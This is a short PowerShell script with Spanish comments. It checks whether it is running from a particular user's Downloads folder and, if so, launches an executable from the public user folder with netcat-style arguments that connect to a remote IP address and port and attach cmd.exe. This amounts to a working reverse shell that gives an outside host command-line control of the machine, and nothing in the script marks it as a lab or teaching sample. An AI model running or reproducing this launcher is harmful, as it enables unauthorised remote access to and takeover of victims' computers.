# Obtener el directorio actual
$directorioActual = Get-Location

# Definir el directorio objetivo
$directorioObjetivo = "C:\users\alooo\Downloads"

# Verificar si el directorio actual es el directorio objetivo
if ($directorioActual.Path -eq $directorioObjetivo) {
    # Definir el comando y los argumentos
    $ejecutable = "C:\users\public\RNM.exe"
    $argumentos = "-nv 193.161.193.99 53941 -e cmd.exe"

    # Ejecutar el comando
    Start-Process -FilePath $ejecutable -ArgumentList $argumentos -NoNewWindow -Wait
}
